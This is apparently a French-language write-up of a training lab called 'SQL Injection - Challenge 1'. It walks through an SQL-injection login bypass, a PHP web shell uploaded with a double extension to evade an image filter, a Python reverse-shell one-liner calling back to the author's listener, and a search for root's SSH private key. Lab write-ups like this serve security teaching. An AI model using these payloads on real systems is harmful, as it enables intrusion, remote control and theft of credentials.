---
title: "SQL Injection - Challenge 1"
summary: "lorsque nous arrivons sur le site on avont une page comme suit :"
publishedAt: "2026-04-27"
tags: ["Sécurité Web"]
status: "published"
platform: "Autres"
section: "LABs"
category: "Sécurité Web"
difficulty: ""
os: ""
service: ""
tools: []
---

Vous pouvez trouvé le lab  a partir du lien suivant : [Course](https://courses.redteamleaders.com/courses/60f2eb1e-7511-4358-9a9e-3f0ab3e5a77c/take)

Dans cet lab il es question d'abusé d'une vulnérabilité qui se trouve sur le site web , puis ensuite abusé des fonctionnalités non sécurisées côté serveur pour atteindre un contexte d’exécution contrôlé au sein de l’application. Grâce à ce chemin d’exécution, l’attaquant peut accéder à des fichiers sensibles sur le système et finalement récupérer la clé privée SSH racine. Le laboratoire conclut lorsque l’attaquant extrait avec succès cette clé, illustrant comment une vulnérabilité web apparemment simple peut entraîner une compromission complète du système et un accès persistant si des secrets tels que les clés SSH sont mal protégés.



# Bypassé l'authentification 

lorsque nous arrivons sur le site on avont une page comme suit  :
![Pasted image 20260410124921.png](/portofolio/images/writeups/obsidian/sql-injection-challenge-1-1ab61d02c3/pasted-image-20260410124921-6d30d4435a.png)


la première chose au quel nous pouvons pensé quand nous voyons une telle page c'est d'essayé une injection SQL booléen dans les champs de saisi pour voir la réaction du site

nous allons appliqué cette injection dans le premier champs de saisi (le champ d'username) :

```sql
' OR 1=1;--
```


![Pasted image 20260410125550.png](/portofolio/images/writeups/obsidian/sql-injection-challenge-1-1ab61d02c3/pasted-image-20260410125550-f01409bb5f.png)



Puis nous tombé sur une interface administrateur

![Pasted image 20260410140216.png](/portofolio/images/writeups/obsidian/sql-injection-challenge-1-1ab61d02c3/pasted-image-20260410140216-f49b0a12b1.png)



# Obtenir un reverse shell

ici avec cette interface qui nous demande d'uploadé des fichiers , nous pouvons nous attendre a une vulnérabilité de RCE (nous allons uploader un fichier qui contient un terminal)


* Donc tous abord nous allons crée un fichier qui contien un terminal (le code si dessous) :

```php
<?php system($_GET['cmd']); ?>
```

* Le site filtre tous les fichiers sauf les fichiers images (.jpg et .png) donc en enregistrant notre fichier nous devons doublé les extension (une extension de type image<font color="#ff0000">(pour bypassé le filtrage)</font> suivit d'une extension de type PHP (pour que notre fichier soit bien exécuté))

![Pasted image 20260410141515.png](/portofolio/images/writeups/obsidian/sql-injection-challenge-1-1ab61d02c3/pasted-image-20260410141515-bb3ac5d7c6.png)


* Maintenant nous allons essayé d'accédé a notre terminal que nous avons uploadé

![Pasted image 20260410142100.png](/portofolio/images/writeups/obsidian/sql-injection-challenge-1-1ab61d02c3/pasted-image-20260410142100-13fb8caf1d.png)

il suffit juste d'ajouté a votre url la partie suivante

```php
/uploads/nom_de_votre_fichier?cmd=commande_que_vous_voudriez_executé
```



# Avoir le reverse shell pour executé nos commandes sur la machines cible

pour avoir le reverse shell on procède comme suit

* en utilisant notre machine kali , on va d'abord ouvrir un port qui va servir a la communication entres les deux terminaux

```bash
nc -lvnp 4444  (ici je veut ouvrir le port 4444)
```


![Pasted image 20260410142732.png](/portofolio/images/writeups/obsidian/sql-injection-challenge-1-1ab61d02c3/pasted-image-20260410142732-62e1c79efd.png)


* Ensuite allez sur le site au niveau de l'url et executé la commande suivante :

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.200.32.244",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```



![Pasted image 20260410143134.png](/portofolio/images/writeups/obsidian/sql-injection-challenge-1-1ab61d02c3/pasted-image-20260410143134-b8789d4c19.png)

ici c'est parceque mon addresse ip qui me connecte au reseau du lab (via vpn ) est le 10.200.32.244
sinon sera differente dans d'autres cas

![Pasted image 20260410143022.png](/portofolio/images/writeups/obsidian/sql-injection-challenge-1-1ab61d02c3/pasted-image-20260410143022-19228dce9b.png)

donc on obtien le reverse shell sur notre machine kali :

![Pasted image 20260410143508.png](/portofolio/images/writeups/obsidian/sql-injection-challenge-1-1ab61d02c3/pasted-image-20260410143508-c6fcf65c64.png)

# Recuperé le fichier ssh de root (id_rsa)

pour se faire nous allons juste lancé la commande 

```bash
find / -name id_rsa 2>/dev/null
```

![Pasted image 20260410144130.png](/portofolio/images/writeups/obsidian/sql-injection-challenge-1-1ab61d02c3/pasted-image-20260410144130-5b9d8edc4b.png)

Donc a partir de là vous pouvez recupéré le fichier et ensuite vous connecté en ssh et recupéré le flag
